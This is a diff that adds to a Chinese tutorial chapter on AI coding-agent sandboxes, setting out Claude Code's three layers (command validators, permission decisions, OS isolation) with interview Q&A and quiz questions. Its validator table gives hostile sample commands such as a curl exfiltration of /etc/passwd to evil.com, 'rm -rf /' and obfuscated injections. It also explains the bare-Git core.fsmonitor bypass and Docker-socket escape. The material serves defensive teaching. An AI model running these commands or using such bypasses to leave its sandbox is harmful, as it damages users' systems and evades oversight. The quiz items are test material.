@@ -811,6 +811,175 @@ public class SandboxExecutor {
   <p style="font-size: 13px; color: var(--color-text-secondary);">绝对不能暴露给 Sandbox 的资源：宿主机 Docker Socket、云厂商元数据 API、内网服务发现端口、SSH 私钥目录。</p>
 </div>
 
+<h3 class="sub-heading">8.4.5 工业级沙箱实践：Claude Code 案例</h3>
+
+<p>前面的 SandboxExecutor 是教学级实现——用 subprocess + 资源限制完成基本隔离。但在生产级 Coding Agent（如 Claude Code）中，沙箱架构远比这复杂。本节以 Claude Code 的真实源码为例，拆解工业级沙箱的<strong>三层纵深防御架构</strong>。</p>
+
+<div class="card" style="border-left: 3px solid var(--color-accent);">
+  <div class="card-title">🏭 为什么看 Claude Code？</div>
+  <p style="font-size: 13px; color: var(--color-text-secondary);">Claude Code 是 Anthropic 推出的 CLI Coding Agent，直接在用户终端执行 Bash 命令、读写文件、运行代码。它的沙箱必须做到：<strong>既不阻止正常开发，又能在 LLM 生成恶意命令时及时阻断</strong>。这是目前公开可分析的最完整的 Agent 沙箱实现之一。</p>
+</div>
+
+<h3 class="sub-heading" style="margin-top: 28px;">① 第一层：命令安全检查（应用级静态分析）</h3>
+
+<p>在命令进入沙箱之前，Claude Code 先做一轮<strong>应用级静态分析</strong>——相当于在门口过安检。这层完全在 JS/TS 代码中完成，不依赖操作系统。</p>
+
+<div class="flowchart-container" data-flowchart='{"nodes":[{"id":"input","label":"用户/LLM 生成\nBash 命令","type":"start"},{"id":"parse","label":"Tree-sitter AST 解析\n拆分复合命令（; | && || $()）\n上限 50 子命令防 ReDoS","type":"process"},{"id":"validate","label":"23+ 安全验证器\n逐条检查每个子命令","type":"process"},{"id":"path","label":"路径验证\n阻断 rm -rf / 等危险路径","type":"process"},{"id":"pass","label":"通过→进入第二层\n权限决策","type":"end"},{"id":"block","label":"阻断→拒绝执行\n返回安全告警","type":"end"}],"edges":[{"from":"input","to":"parse"},{"from":"parse","to":"validate"},{"from":"validate","to":"path"},{"from":"path","to":"pass","label":"全部通过"},{"from":"path","to":"block","label":"检测到威胁"}]}'></div>
+
+<p>核心组件：</p>
+
+<div class="comparison-table">
+  <table>
+    <thead>
+      <tr>
+        <th style="text-align: left;">验证器</th>
+        <th style="text-align: left;">检测目标</th>
+        <th style="text-align: left;">示例</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr><td><strong>命令替换检测</strong></td><td><code>$()</code> / 反引号注入</td><td><code>curl $(cat /etc/passwd).evil.com</code></td></tr>
+      <tr><td><strong>Shell 元字符</strong></td><td><code>;</code> <code>|</code> <code>&amp;&amp;</code> <code>||</code> 后跟危险命令</td><td><code>ls; rm -rf /</code></td></tr>
+      <tr><td><strong>Heredoc 白名单</strong></td><td>定界符单引号/转义验证</td><td><code>&lt;&lt;EOF</code> 中嵌入恶意命令</td></tr>
+      <tr><td><strong>Git Commit 注入</strong></td><td><code>-m</code> 前的 Shell 元字符</td><td><code>git commit -m "$(evil)"</code></td></tr>
+      <tr><td><strong>Jq system() 阻断</strong></td><td>jq 调用 <code>system()</code> 函数</td><td><code>jq 'system("rm -rf /")'</code></td></tr>
+      <tr><td><strong>混淆标志检测</strong></td><td>ANSI-C 引号 <code>$'...'</code> / locale 引号 <code>$"..."</code></td><td>用 <code>$'\x72\x6d'</code> 绕过 "rm" 关键词检测</td></tr>
+      <tr><td><strong>Zsh 危险命令</strong></td><td>Zsh 模块加载、<code>zmodload</code> 攻击</td><td><code>zmodload zsh/system</code></td></tr>
+      <tr><td><strong>IFS 注入</strong></td><td>修改 <code>$IFS</code> 改变分词行为</td><td><code>IFS=':'; evil:command</code></td></tr>
+    </tbody>
+  </table>
+</div>
+
+<div class="info-box">
+  <p style="font-size: 13px;"><strong>关键设计</strong>：复合命令拆分上限 <code>MAX_SUBCOMMANDS_FOR_SECURITY_CHECK = 50</code>。超过 50 个子命令时直接降级为 "ask" 模式（要求用户确认），防止正则爆炸攻击（ReDoS）。这是一个典型的<strong>安全 vs 可用性权衡</strong>——正常开发命令极少超过 50 个子命令。</p>
+</div>
+
+<h3 class="sub-heading" style="margin-top: 28px;">② 第二层：权限决策引擎（沙箱入口）</h3>
+
+<p>通过安全检查后，命令进入<strong>权限决策引擎</strong>——决定这条命令是在沙箱内自动执行、需要用户确认、还是直接拒绝。核心是 <code>shouldUseSandbox()</code> 函数的三步决策：</p>
+
+<div class="flowchart-container" data-flowchart='{"nodes":[{"id":"step1","label":"Step 1: 沙箱是否启用？\n检查 sandbox.enabled 配置\n支持 failIfUnavailable 硬失败模式","type":"decision"},{"id":"step2","label":"Step 2: 是否显式禁用沙箱？\n检查 dangerouslyDisableSandbox 参数\n受 allowUnsandboxedCommands 限制","type":"decision"},{"id":"step3","label":"Step 3: 是否在排除列表？\n匹配 excludedCommands（用户便利功能\n非安全边界，支持复合命令拆分匹配）","type":"decision"},{"id":"sandbox","label":"进入沙箱执行\nauto-allow 模式：自动执行\nregular 模式：需用户确认","type":"process"},{"id":"ask","label":"降级为 ask 模式\n要求用户手动确认","type":"end"}],"edges":[{"from":"step1","to":"step2","label":"是"},{"from":"step1","to":"ask","label":"否"},{"from":"step2","to":"step3","label":"否"},{"from":"step2","to":"sandbox","label":"是（且允许禁用）"},{"from":"step3","to":"sandbox","label":"不在列表"},{"from":"step3","to":"sandbox","label":"在列表中\n（仍走沙箱但跳过\nauto-allow）"}]}'></div>
+
+<p>三种沙箱模式：</p>
+
+<div class="comparison-table">
+  <table>
+    <thead>
+      <tr>
+        <th style="text-align: left;">模式</th>
+        <th style="text-align: left;">行为</th>
+        <th style="text-align: left;">适用场景</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr><td><strong>auto-allow</strong></td><td>沙箱内命令自动执行，无需确认</td><td>可信项目、日常开发</td></tr>
+      <tr><td><strong>regular</strong></td><td>每条命令需用户确认后执行</td><td>新项目、敏感环境</td></tr>
+      <tr><td><strong>disabled</strong></td><td>不使用沙箱，所有命令需确认</td><td>沙箱不可用或用户显式关闭</td></tr>
+    </tbody>
+  </table>
+</div>
+
+<div class="card" style="border-left: 3px solid var(--color-info);">
+  <div class="card-title">⚙️ 5 层设置源合并</div>
+  <p style="font-size: 13px; color: var(--color-text-secondary);">沙箱配置有 5 个来源，按优先级从高到低合并：</p>
+  <p style="font-size: 13px; color: var(--color-text-secondary);"><code>policySettings</code>（企业策略） &gt; <code>flagSettings</code>（命令行参数） &gt; <code>projectSettings</code>（项目配置） &gt; <code>localSettings</code>（本地配置） &gt; <code>userSettings</code>（用户全局配置）</p>
+  <p style="font-size: 13px; color: var(--color-text-secondary);">企业策略可锁定沙箱设置（<code>areSandboxSettingsLockedByPolicy</code>），低优先级源无法覆盖——这是企业安全合规的关键机制。</p>
+</div>
+
+<h3 class="sub-heading" style="margin-top: 28px;">③ 第三层：OS 沙箱执行（系统级隔离）</h3>
+
+<p>通过权限决策后，命令最终在<strong>操作系统级沙箱</strong>中执行。Claude Code 根据平台选择不同的 OS 沙箱技术：</p>
+
+<div class="comparison-table">
+  <table>
+    <thead>
+      <tr>
+        <th style="text-align: left;">平台</th>
+        <th style="text-align: left;">沙箱技术</th>
+        <th style="text-align: left;">原理</th>
+        <th style="text-align: left;">依赖</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr><td><strong>macOS</strong></td><td>Seatbelt（sandbox-exec）</td><td>内核级沙箱配置文件，限制文件系统访问、网络、系统调用</td><td>系统内置，零安装</td></tr>
+      <tr><td><strong>Linux/WSL2</strong></td><td>Bubblewrap + seccomp</td><td>bwrap 创建挂载命名空间（文件系统隔离），seccomp 过滤系统调用</td><td>需 <code>apt install bubblewrap socat</code></td></tr>
+      <tr><td><strong>Windows</strong></td><td>PowerShell 沙箱包装</td><td><code>pwsh -NoProfile -NonInteractive -EncodedCommand</code> 预包装</td><td>系统内置</td></tr>
+    </tbody>
+  </table>
+</div>
+
+<div class="card" style="border-left: 3px solid var(--color-accent);">
+  <div class="card-title">📁 文件系统三级控制</div>
+  <p style="font-size: 13px; color: var(--color-text-secondary);">Bubblewrap 通过挂载命名空间实现三级文件系统控制：</p>
+  <ul style="font-size: 13px; color: var(--color-text-secondary); padding-left: 18px; line-height: 2;">
+    <li><strong>可写</strong>（<code>--bind</code>）：项目目录、<code>/tmp</code>——Agent 可读写</li>
+    <li><strong>只读</strong>（<code>--ro-bind</code>）：系统库、<code>/usr/bin</code>——Agent 可读不可写</li>
+    <li><strong>屏蔽</strong>（<code>--dev-null</code>）：敏感路径——Agent 完全不可见</li>
+  </ul>
+  <p style="font-size: 13px; color: var(--color-text-secondary);">特别地，Claude Code <strong>禁止写入</strong> <code>settings.json</code> 和 <code>.claude/skills/</code> 目录——防止 Agent 修改自身配置实现沙箱逃逸。</p>
+</div>
+
+<div class="card" style="border-left: 3px solid var(--color-info);">
+  <div class="card-title">🌐 网络隔离架构</div>
+  <p style="font-size: 13px; color: var(--color-text-secondary);">沙箱网络通过<strong>代理 + 域名白名单</strong>实现，而非直接禁用网络：</p>
+  <ul style="font-size: 13px; color: var(--color-text-secondary); padding-left: 18px; line-height: 2;">
+    <li><strong>HTTP 代理</strong>（<code>httpProxyPort</code>）：MITM 代理拦截 HTTP 请求，只允许 <code>allowedDomains</code> 中的域名</li>
+    <li><strong>SOCKS 代理</strong>（<code>socksProxyPort</code>）：拦截 TCP 连接，非白名单域名直接拒绝</li>
+    <li><strong>Unix Domain Sockets</strong>：通过 seccomp 阻断（防 <code>/var/run/docker.sock</code> 逃逸）</li>
+  </ul>
+  <p style="font-size: 13px; color: var(--color-text-secondary);">这意味着 Agent 可以 <code>npm install</code>（npm registry 在白名单中），但不能 <code>curl http://evil.com</code>。</p>
+</div>
+
+<h3 class="sub-heading" style="margin-top: 28px;">④ 安全加固亮点</h3>
+
+<div class="card" style="border-left: 3px solid var(--color-error);">
+  <div class="card-title">🚨 裸 Git 仓库攻击防护</div>
+  <p style="font-size: 13px; color: var(--color-text-secondary);">攻击者可创建一个裸 Git 仓库，设置 <code>core.fsmonitor</code> 指向恶意脚本。当 Agent 在该仓库中执行 <code>git status</code> 时，Git 会自动执行 <code>core.fsmonitor</code> 指定的脚本——绕过沙箱的命令检查。</p>
+  <p style="font-size: 13px; color: var(--color-text-secondary);">Claude Code 的防御：<code>scrubBareGitRepoFiles()</code> 在进入沙箱前扫描并清除裸 Git 仓库的危险配置文件。这是<strong>针对真实攻击向量的深度防御</strong>。</p>
+</div>
+
+<div class="card" style="border-left: 3px solid var(--color-success);">
+  <div class="card-title">🏢 企业策略锁定</div>
+  <p style="font-size: 13px; color: var(--color-text-secondary);">企业版支持 <code>areSandboxSettingsLockedByPolicy</code> 和 <code>allowManagedDomainsOnly</code>：</p>
+  <ul style="font-size: 13px; color: var(--color-text-secondary); padding-left: 18px; line-height: 2;">
+    <li>锁定后，用户无法通过任何配置源修改沙箱设置</li>
+    <li>网络白名单只能由企业管理员修改，用户无法自行添加域名</li>
+    <li>适用于金融、医疗等合规要求严格的场景</li>
+  </ul>
+</div>
+
+<div class="card" style="border-left: 3px solid var(--color-accent);">
+  <div class="card-title">⚡ 配置热重载</div>
+  <p style="font-size: 13px; color: var(--color-text-secondary);">沙箱配置使用 memoized 缓存——以 settings 对象为 key，配置变更时自动失效重建。用户修改 <code>.claude/settings.json</code> 后，下一条命令立即使用新配置，无需重启 Agent。</p>
+</div>
+
+<div class="card" style="border-left: 3px solid var(--color-warning);">
+  <div class="card-title">📋 违规审计（Violation Store）</div>
+  <p style="font-size: 13px; color: var(--color-text-secondary);">所有沙箱违规事件（如尝试写入被屏蔽路径、访问非白名单域名）被记录到 <code>SandboxViolationStore</code>，并在 stderr 中以特殊标记输出。支持事后审计和告警。</p>
+</div>
+
+<div class="card" style="border-left: 3px solid var(--color-info);">
+  <div class="card-title">🔧 跨平台工程细节</div>
+  <p style="font-size: 13px; color: var(--color-text-secondary);">真实的跨平台沙箱实现充满了只有踩过坑才知道的细节：</p>
+  <ul style="font-size: 13px; color: var(--color-text-secondary); padding-left: 18px; line-height: 2;">
+    <li><strong>PowerShell 沙箱逃逸防护</strong>：<code>wrapWithSandbox</code> 硬编码 <code>/bin/sh -c '&lt;cmd&gt;'</code> 会丢失 <code>pwsh -NoProfile -NonInteractive</code> 参数。解决方案：用 <code>pwsh -EncodedCommand &lt;base64&gt;</code> 预包装，base64 可穿过 <code>shellquote.quote()</code> 层不被解析</li>
+    <li><strong>O_NOFOLLOW 防 Symlink 攻击</strong>：输出文件以 <code>O_NOFOLLOW</code> 标志打开，如果文件是 symlink 则拒绝写入，防止攻击者用符号链接重定向输出</li>
+    <li><strong>Secret Shield</strong>：Bubblewrap 在宿主 cwd 创建 0 字节挂载点文件拒绝访问，但会残留 ghost dotfiles。设计上接受这个副作用以换取安全性</li>
+    <li><strong>Windows 输出文件模式</strong>：用 <code>'w'</code> 而非 <code>'a'</code> 打开——<code>'a'</code> 模式在 Windows 上会丢失 <code>FILE_WRITE_DATA</code> 权限，导致 MSYS2/Cygwin 环境静默丢弃输出</li>
+    <li><strong>POSIX 原子写入</strong>：stdout/stderr 用 <code>O_APPEND</code> 原子交错写入，避免多进程输出混乱</li>
+  </ul>
+</div>
+
+<h3 class="sub-heading" style="margin-top: 28px;">⑤ 三层防御的纵深协同</h3>
+
+<p>Claude Code 沙箱的精髓在于<strong>纵深防御</strong>——三层中任何一层都可以独立阻断威胁：</p>
+
+<div class="flowchart-container" data-flowchart='{"nodes":[{"id":"cmd","label":"LLM 生成 Bash 命令","type":"start"},{"id":"l1","label":"第一层：命令安全检查\n23+ 验证器 + AST 解析\n检测注入、混淆、危险路径","type":"process"},{"id":"l2","label":"第二层：权限决策\nshouldUseSandbox() 三步决策\n选择 auto-allow/regular/disabled","type":"process"},{"id":"l3","label":"第三层：OS 沙箱执行\nSeatbelt / Bubblewrap + seccomp\n文件系统隔离 + 网络代理","type":"process"},{"id":"exec","label":"命令在隔离环境中执行\n资源受限、网络过滤、路径隔离","type":"end"},{"id":"block1","label":"阻断：返回安全告警","type":"end"},{"id":"block2","label":"降级：要求用户确认","type":"end"},{"id":"block3","label":"拒绝：违规记录到\nViolationStore","type":"end"}],"edges":[{"from":"cmd","to":"l1"},{"from":"l1","to":"l2","label":"通过"},{"from":"l1","to":"block1","label":"检测到威胁"},{"from":"l2","to":"l3","label":"进入沙箱"},{"from":"l2","to":"block2","label":"需用户确认"},{"from":"l3","to":"exec","label":"执行成功"},{"from":"l3","to":"block3","label":"违规操作"}]}'></div>
+
+<div class="info-box">
+  <p style="font-size: 13px;"><strong>对比教学级 SandboxExecutor</strong>：8.4.3 的实现只有一层（进程级资源限制），Claude Code 有三层。教学版只能限制 CPU/内存，无法阻止 <code>curl evil.com</code>；Claude Code 的网络代理可以。教学版无法检测 <code>rm -rf /</code>；Claude Code 的路径验证器可以。这就是<strong>纵深防御</strong>的价值——不依赖单一安全机制。</p>
+</div>
+
 <!-- ===== 8.5 三者协同 ===== -->
 <h2 class="section-heading">8.5 三者协同：完整协作流程</h2>
 
@@ -1330,6 +1499,56 @@ function onUserActivity() {
       <strong>核心原则</strong>:宁可提前终止,不可带病运行。熔断是主动保护,不是失败。
     </div>
   </div>
+  
+  <div class="qa-item">
+    <div class="qa-question">Q8: Claude Code 的三层纵深防御架构是什么？每层的作用？</div>
+    <div class="qa-answer">
+      <strong>① 命令安全检查（应用级静态分析）</strong>：23+ 安全验证器 + Tree-sitter AST 解析，检测命令注入、Shell 元字符、混淆标志等。复合命令拆分上限 50 子命令防 ReDoS。<br>
+      <strong>② 权限决策引擎（沙箱入口）</strong>：<code>shouldUseSandbox()</code> 三步决策——沙箱是否启用 → 是否显式禁用 → 是否在排除列表。三种模式：auto-allow（自动执行）/ regular（需确认）/ disabled（不使用沙箱）。<br>
+      <strong>③ OS 沙箱执行（系统级隔离）</strong>：macOS 用 Seatbelt（sandbox-exec），Linux 用 Bubblewrap + seccomp。文件系统三级控制（可写/只读/屏蔽）+ 网络代理 + 域名白名单。<br><br>
+      <strong>纵深防御的核心</strong>：三层中任何一层都可独立阻断威胁。即使第一层漏过某条恶意命令，第二层可以降级为需确认，第三层可以在 OS 级别隔离其影响。
+    </div>
+  </div>
+  
+  <div class="qa-item">
+    <div class="qa-question">Q9: Claude Code 的网络隔离是如何实现的？为什么不用直接禁用网络？</div>
+    <div class="qa-answer">
+      Claude Code 使用<strong>代理 + 域名白名单</strong>而非直接禁网：<br><br>
+      <strong>HTTP 代理</strong>（MITM）：拦截 HTTP 请求，只放行 <code>allowedDomains</code> 中的域名（如 npm registry）。<br>
+      <strong>SOCKS 代理</strong>：拦截 TCP 连接，非白名单域名直接拒绝。<br>
+      <strong>seccomp</strong>：阻断 Unix Domain Sockets（防 <code>/var/run/docker.sock</code> 逃逸）。<br><br>
+      <strong>不禁网的原因</strong>：Agent 需要正常开发能力——<code>npm install</code>、<code>pip install</code>、<code>git clone</code> 都需要网络。直接禁网会让 Agent 失去实用性。代理 + 白名单实现了<strong>最小权限网络</strong>——该放的放，该挡的挡。
+    </div>
+  </div>
+  
+  <div class="qa-item">
+    <div class="qa-question">Q10: 什么是裸 Git 仓库攻击？Claude Code 如何防御？</div>
+    <div class="qa-answer">
+      <strong>攻击原理</strong>：攻击者创建一个裸 Git 仓库，设置 <code>core.fsmonitor</code> 指向恶意脚本。当 Agent 在该仓库中执行 <code>git status</code> 时，Git 自动执行 <code>core.fsmonitor</code> 指定的脚本——绕过沙箱的命令安全检查（因为这不是 Agent 生成的命令，而是 Git 自己执行的）。<br><br>
+      <strong>Claude Code 防御</strong>：<code>scrubBareGitRepoFiles()</code> 在进入沙箱前扫描并清除裸 Git 仓库的危险配置。这是<strong>针对真实攻击向量的深度防御</strong>——不仅检查 Agent 生成的命令，还防御第三方工具被利用的间接执行。
+    </div>
+  </div>
+
+  <div class="qa-item">
+    <div class="qa-question">Q11: Claude Code 的权限系统为什么不是一个函数，而是一个系统？</div>
+    <div class="qa-answer">
+      <strong>设计原因</strong>：单一权限检查函数无法应对多维度威胁。Claude Code 的权限系统由 20+ 个模块组成，每个模块单一职责：<br>
+      ① <strong>bashClassifier</strong>：命令分类器，判断命令安全性<br>
+      ② <strong>shadowedRuleDetection</strong>：检测用户规则是否被更高优先级规则覆盖<br>
+      ③ <strong>denialTracking</strong>：记录被拒绝的命令，避免重复弹窗<br>
+      ④ <strong>permissionExplainer</strong>：向用户解释拦截原因<br>
+      ⑤ <strong>bypassPermissionsKillswitch</strong>：紧急熔断，一键禁用所有权限绕过<br><br>
+      <strong>面试要点</strong>：权限不是一个函数，而是一个系统。设计原则是<strong>关注点分离</strong>——每个模块独立测试、可组合使用。
+    </div>
+  </div>
+
+  <div class="qa-item">
+    <div class="qa-question">Q12: Claude Code 如何通过 Prompt 引导 LLM 正确使用沙箱？</div>
+    <div class="qa-answer">
+      Claude Code 的 System Prompt 明确引导：<em>“默认应在沙箱内运行命令；除非特定条件，否则不要设置 dangerouslyDisableSandbox: true”</em>。这条规则让 LLM 生成的命令<strong>从源头走沙箱路径</strong>，而不是等命令生成后再拦截。<br><br>
+      关键设计：<code>dangerouslyDisableSandbox</code> 需显式声明，且<strong>逐个重置回沙箱</strong>——不会因为一次禁用就永久绕过。这是 <strong>Prompt Engineering 与 Safety Engineering 交叉</strong>的典型案例。
+    </div>
+  </div>
 </div>
 
 <!-- ===== Quiz ===== -->
@@ -1480,6 +1699,54 @@ const ch21Questions = [
     ],
     answer: [1],
     explanation: '异步任务模式的最大优势是用户体验——用户提交任务后可以去做别的事，Agent 在云端自主执行（通常需要几分钟到几十分钟），完成后通知用户。这适合复杂编码任务（如“重构这个模块”），用户不需要盯着屏幕等。'
+  },
+  {
+    type: 'single',
+    question: 'Claude Code 的三层纵深防御架构中，第一层“命令安全检查”的核心作用是？',
+    options: [
+      '在 OS 级别隔离命令执行环境',
+      '在命令进入沙箱前做应用级静态分析，检测注入和危险命令',
+      '决定命令是否需要用户确认',
+      '限制命令的 CPU 和内存使用'
+    ],
+    answer: [1],
+    explanation: '第一层“命令安全检查”是应用级静态分析——用 23+ 安全验证器和 Tree-sitter AST 解析，在命令进入沙箱前检测命令注入、Shell 元字符、混淆标志等。第二层是权限决策（shouldUseSandbox），第三层是 OS 沙箱执行（Seatbelt/Bubblewrap）。'
+  },
+  {
+    type: 'multiple',
+    question: 'Claude Code 的 OS 沙箱在 Linux 上使用 Bubblewrap + seccomp，以下哪些是该方案的能力？（多选）',
+    options: [
+      '通过挂载命名空间实现文件系统三级控制（可写/只读/屏蔽）',
+      '通过 seccomp 阻断 Unix Domain Sockets（防 Docker Socket 逃逸）',
+      '通过 HTTP/SOCKS 代理 + 域名白名单实现网络隔离',
+      '通过 cgroups 限制 CPU 和内存使用'
+    ],
+    answer: [0, 1, 2],
+    explanation: 'Bubblewrap 提供挂载命名空间（文件系统隔离），seccomp 过滤系统调用（阻断 Unix Domain Sockets），HTTP/SOCKS 代理实现网络白名单。CPU/内存限制不是 Bubblewrap 的职责，由进程级资源限制（ulimit/cgroups）单独处理。'
+  },
+  {
+    type: 'single',
+    question: 'Claude Code 为什么使用“代理 + 域名白名单”而不是直接禁用网络？',
+    options: [
+      '直接禁网会影响 Agent 性能',
+      '代理比禁网更安全',
+      'Agent 需要 npm install、git clone 等正常开发能力，禁网会让 Agent 失去实用性',
+      '法律要求必须使用代理'
+    ],
+    answer: [2],
+    explanation: 'Agent 需要正常开发能力——npm install、pip install、git clone 都需要网络。直接禁网会让 Agent 失去实用性。代理 + 白名单实现“最小权限网络”：该放的放（npm registry），该挡的挡（evil.com），兼顾安全和可用性。'
+  },
+  {
+    type: 'single',
+    question: '裸 Git 仓库攻击（core.fsmonitor）的威胁在于？',
+    options: [
+      'Git 会自动执行 core.fsmonitor 指定的脚本，绕过沙箱命令检查',
+      'Git 会删除项目文件',
+      'Git 会泄露用户凭据到远程仓库',
+      'Git 会修改沙箱配置文件'
+    ],
+    answer: [0],
+    explanation: '攻击者设置裸 Git 仓库的 core.fsmonitor 指向恶意脚本，当 Agent 执行 git status 时，Git 自动执行该脚本——这不是 Agent 生成的命令，而是 Git 自己执行的，因此绕过了沙箱的命令安全检查。Claude Code 用 scrubBareGitRepoFiles() 在进入沙箱前清除危险配置。'
   }
 ];
 
